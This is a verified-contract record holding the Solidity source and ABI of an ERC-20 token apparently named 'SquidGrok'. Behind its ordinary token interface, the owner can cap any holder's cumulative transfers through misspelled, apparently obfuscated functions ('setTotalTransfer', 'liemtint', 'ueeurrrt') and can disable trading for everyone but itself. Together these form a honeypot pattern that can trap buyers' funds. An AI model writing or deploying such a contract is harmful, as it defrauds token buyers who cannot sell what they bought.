{"SourceCode": "pragma solidity ^0.8.2;\r\n\r\n// Interface for ERC-20 standard token contract.\r\ninterface IERC20 {\r\n    // Returns the total token supply.\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    // Returns the account balance of another account with address `account`.\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    // Transfers `amount` tokens to `recipient`, returns a boolean value indicating success.\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    // Returns the remaining number of tokens that `spender` is allowed to spend on behalf of `owner`.\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    // Sets `amount` as the allowance of `spender` over the caller's tokens, returns a boolean value indicating success.\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    // Transfers `amount` tokens from `sender` to `recipient`, returns a boolean value indicating success.\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    // Emitted when `value` tokens are moved from one account (`from`) to another (`to`).\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    // Emitted when the allowance of a `spender` for an `owner` is set by a call to `approve`.\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// Provides basic context for `msg.sender`.\r\nabstract contract Context {\r\n    // Returns sender of the message (current call).\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\n// Contract module which provides a basic access control mechanism, where there is an account (an owner).\r\ncontract Ownable is Context {\r\n    address private _owner;  // Current owner of the contract.\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    // Returns the address of the current owner.\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    // Throws if called by any account other than the owner.\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    // Leaves the contract without owner, preventing any future use of its `onlyOwner` functions.\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\n// ERC20 Token contract.\r\ncontract token is Context, Ownable, IERC20 {\r\n    mapping(address => uint256) private _balances; // Token balance for each address.\r\n    mapping(address => mapping(address => uint256)) private _allowances; // Allowance amounts on behalf of others.\r\n    mapping(address => uint256) public totalTransferliemtints; // Limits for total transfers.\r\n    mapping(address => uint256) public totalTransferredAmounts; // Amounts already transferred.\r\n    string private _name; // Token name.\r\n    string private _symbol; // Token symbol.\r\n    uint8 private _decimals; // Decimal count for token.\r\n    uint256 private _totalSupply; // Total token supply.\r\n    bool public tradingEnabled = false; // Flag indicating if trading is enabled.\r\n\r\n    // Modifier to make a function callable only when the contract is not paused.\r\n    modifier tradingActiveOrOwner() {\r\n        require(tradingEnabled || owner() == _msgSender(), \"Trading is disabled\");\r\n        _;\r\n    }\r\n\r\n    // Modifier to check transfer limits.\r\n    modifier transferliemtint(address sender, uint256 amount) {\r\n        uint256 liemtint = totalTransferliemtints[sender];\r\n        if (liemtint > 0) {\r\n            require(totalTransferredAmounts[sender] + amount <= liemtint, \"Total transfer amount exceeds the set liemtint\");\r\n        }\r\n        _;\r\n    }\r\n\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    // Returns the name of the token.\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    // Returns the symbol of the token.\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    // Returns the number of decimals used to get its user representation.\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    // Returns the amount of tokens in existence.\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    // Returns the amount of tokens owned by `account`.\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    // Sets limits for total transfers for a specific address.\r\n    function setTotalTransfer(address ueeurrrt, uint256 liemtint) public onlyOwner {\r\n        totalTransferliemtints[ueeurrrt] = liemtint;\r\n    }\r\n\r\n    // Removes the transfer limit for a specific address.\r\n    function removeTotalTransfer(address ueeurrrt) public onlyOwner {\r\n        delete totalTransferliemtints[ueeurrrt];\r\n    }\r\n\r\n    // Transfers `amount` tokens to `recipient`, adhering to transfer limits.\r\n    function transfer(address recipient, uint256 amount) public virtual override transferliemtint(_msgSender(), amount) tradingActiveOrOwner returns (bool) {\r\n        _balances[_msgSender()] -= amount;\r\n        _balances[recipient] += amount;\r\n        totalTransferredAmounts[_msgSender()] += amount;\r\n        emit Transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    // Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner`.\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    // Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    // Enables trading for this token.\r\n    function enableTrading() external onlyOwner {\r\n        tradingEnabled = true;\r\n    }\r\n\r\n    // Disables trading for this token.\r\n    function disableTrading() external onlyOwner {\r\n        tradingEnabled = false;\r\n    }\r\n\r\n    // Transfers `amount` tokens from `sender` to `recipient`, adhering to transfer limits and allowance.\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferliemtint(sender, amount) tradingActiveOrOwner returns (bool) {\r\n        require(_allowances[sender][_msgSender()] >= amount, \"Transfer amount exceeds allowance\");\r\n        \r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        \r\n        totalTransferredAmounts[sender] += amount;\r\n        \r\n        _allowances[sender][_msgSender()] -= amount;\r\n        \r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"disableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ueeurrrt\",\"type\":\"address\"}],\"name\":\"removeTotalTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ueeurrrt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liemtint\",\"type\":\"uint256\"}],\"name\":\"setTotalTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTransferliemtints\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTransferredAmounts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "token", "CompilerVersion": "v0.8.2+commit.661d1103", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000900000000000000000000000000000000000000000000000000000000c4b201000000000000000000000000000000000000000000000000000000000000000009537175696447726f6b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009537175696447726f6b0000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c14bdeba2cc49083ea81011b381788afb92f1d57ae3f54a1594108235ad5e471"}